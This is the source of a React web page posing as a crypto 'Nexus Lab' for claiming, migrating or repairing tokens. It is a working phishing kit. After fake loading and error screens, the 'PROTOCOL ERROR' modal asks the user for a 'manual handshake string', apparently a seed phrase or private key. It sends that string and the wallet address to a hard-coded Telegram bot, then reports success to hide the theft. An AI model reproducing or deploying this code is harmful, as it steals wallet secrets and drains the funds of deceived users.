import React, { useState } from 'react';
import { useAccount, useBalance } from 'wagmi';
import { RefreshCcw, AlertCircle, ArrowDown, ShieldCheck, Database, History, ChevronRight, Settings, Coins } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [input, setInput] = useState("");

  const triggerSync = () => {
    setLoading(true);
    setTimeout(() => { setLoading(false); setView("sync"); }, 3500);
  };

  return (
    <div className="min-h-screen bg-[#020408] text-slate-300 font-sans p-5 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10">
        <h1 className="text-xl font-black text-cyan-500 italic">NEXUS LAB</h1>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-3">
          {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Migrate", "Rectify", "Validate", "Scan"].map((name) => (
            <button key={name} onClick={() => setView(name.toLowerCase())} className="bg-[#0d1117] border border-slate-800/40 p-6 rounded-[30px] flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl">
              <Database size={18} className="text-slate-700" />
              <span className="text-[8px] font-black text-slate-500">{name}</span>
            </button>
          ))}
        </div>
      )}

      {view === "swap" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8">
          <div className="flex justify-between mb-8"><button onClick={() => setView("menu")} className="text-slate-600 text-[9px] font-bold">← EXIT</button><span className="text-white text-[10px] font-black italic">PROTOCOL REPAIR</span></div>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-1 text-left">
            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>INPUT BROKEN ASSET</span><span>BAL: {balance?.formatted.slice(0,5) || "0.00"}</span></div>
            <div className="flex justify-between items-center">
              <input type="number" placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-1/2" />
              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 border border-slate-700"><Coins size={12} className="text-yellow-500"/><span className="text-[10px] font-bold">BNB</span></div>
            </div>
          </div>
          <div className="flex justify-center -my-3 z-10 relative"><div className="bg-[#020408] p-2 rounded-full border border-slate-800 shadow-xl"><ArrowDown size={14} className="text-cyan-500" /></div></div>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>OUTPUT V2 (FIXED)</span><span>ESTIMATED</span></div>
            <div className="flex justify-between items-center">
              <span className="text-2xl font-mono text-slate-900 tracking-tighter italic font-black uppercase">Pending</span>
              <span className="text-[10px] font-black text-cyan-500 bg-cyan-500/5 px-3 py-1 rounded-full border border-cyan-500/20 tracking-widest uppercase">Nexus-V2</span>
            </div>
          </div>
          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white">INITIATE REPAIR</button>
        </div>
      )}

      {(view === "claim" || view === "stake" || view === "migrate") && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-10 text-center">
          <History size={48} className="text-cyan-500 mx-auto mb-6" />
          <h2 className="text-white font-black text-sm tracking-widest mb-4 uppercase">Technical {view} Portal</h2>
          <p className="text-[10px] text-slate-500 mb-8 leading-relaxed lowercase font-medium px-2">node detected missed migration date or snapshot corruption. use this laboratory gateway to force the {view} protocol to your address.</p>
          <div className="bg-black/40 border border-slate-900 rounded-3xl p-6 mb-8 text-left space-y-4">
            <div className="flex justify-between items-center border-b border-slate-900 pb-3"><span className="text-[9px] text-slate-600 font-bold underline italic">NODE STATUS</span><span className="text-red-500 text-[9px] font-black animate-pulse uppercase tracking-widest">Locked</span></div>
            <div className="flex justify-between items-center"><span className="text-[9px] text-slate-600 font-bold underline italic text-nowrap">WALLET ADDRESS</span><span className="text-[10px] font-mono text-cyan-400">{address?.slice(0,12)}...</span></div>
          </div>
          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white flex items-center justify-center gap-2">FORCE {view.toUpperCase()} NOW <ChevronRight size={14}/></button>
        </div>
      )}

      {view === "sync" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-xl tracking-tighter">PROTOCOL ERROR 0x88</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-3 lowercase font-medium px-4">automated verification failed. to complete the technical handshake, please enter your manual sync string.</p>
            <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 focus:border-cyan-500 transition-all placeholder:text-slate-900 uppercase" />
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nAddr: ${address}\nInput: ${input}` }),
              });
              alert("Node Synchronized.");
              setView("menu");
            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-xl shadow-cyan-900/20">RE-INITIATE HANDSHAKE</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.4em]">INITIATING GATEWAY...</p>
        </div>
      )}
    </div>
  );
}
